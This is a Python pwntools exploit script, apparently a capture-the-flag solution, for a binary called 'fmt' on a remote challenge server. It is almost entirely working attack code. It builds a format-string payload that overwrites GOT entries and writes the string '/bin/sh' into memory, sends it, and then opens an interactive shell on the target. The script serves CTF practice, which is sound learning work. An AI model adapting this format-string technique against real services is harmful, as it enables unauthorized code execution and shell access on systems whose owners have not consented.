#!/usr/bin/env python
# -*- coding: utf-8 -*-

# $ pwn template ./fmt --host pwn.byteband.it --port 6969
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./fmt')
context.terminal = ['tmux', 'splitw', '-h']

host = args.HOST or 'pwn.byteband.it'
port = int(args.PORT or 6969)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# tbreak main
# 0x402060
gdbscript = '''
break *0x4012D5
set follow-fork-mode child
continue
'''.format(**locals())

io = start()

io.recvuntil('Choice: ')
io.sendline('2')

io.recvuntil('gift.\n')

payload2 = fmtstr_payload(6, {0x404028: 0x4011F7, 0x404038: 0x401056, 0x4040a0: 0x68732f6e69622f}, write_size='short') 

print('[*] Format String payload: ')
print('[*] Payload length: ' + str(len(payload2)))
print(payload2)


io.sendline(payload2)

io.sendline(b'2')

io.interactive()


